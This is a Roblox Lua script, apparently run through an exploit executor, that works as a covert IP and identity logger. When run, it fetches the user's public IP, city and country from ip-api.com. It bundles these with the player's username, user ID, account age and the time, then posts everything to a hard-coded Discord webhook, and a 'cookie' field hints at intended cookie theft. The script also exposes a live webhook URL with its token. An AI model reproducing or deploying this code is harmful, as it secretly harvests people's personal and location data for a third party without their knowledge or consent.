local webhook_url = "https://discord.com/api/webhooks/1541135608406081699/TMcLS-uM2Tp7UorYVS3Zsvpv2-RxPr27eDhLEyCR5LDPKcku42yB_79ypXMFJfYnUE6M"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Func to get IP / Location data
local function getIPData()
    local success, response = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)
    if success then
        return HttpService:JSONDecode(response)
    end
    return {}
end

local ipData = getIPData()
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

local data = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "New  \226\156\168",
        ["description"] = "A user executed.",
        ["color"] = 0xFF0000,
        ["fields"] = {
            {
                ["name"] = "user",
                ["value"] = player.Name,
                ["inline"] = true
            },
            {
                ["name"] = "id",
                ["value"] = tostring(player.UserId),
                ["inline"] = true
            },
            {
                ["name"] = "idade da conta",
                ["value"] = tostring(player.AccountAge) .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "local, data e hora",
                ["value"] = "Time: " .. currentTime .. "\nLocation: " .. (ipData.city or "Unknown") .. ", " .. (ipData.country or "Unknown") .. "\nIP: " .. (ipData.query or "Unknown"),
                ["inline"] = false
            },
            {
                ["name"] = "cookie",
                ["value"] = "Note: so funciona se tiver um client especifico.",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "sevennn \226\153\165"
        }
    }}
}

local jsonData = HttpService:JSONEncode(data)

local request = http_request or request or HttpPost or syn.request
if request then
    request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = jsonData
    })
end
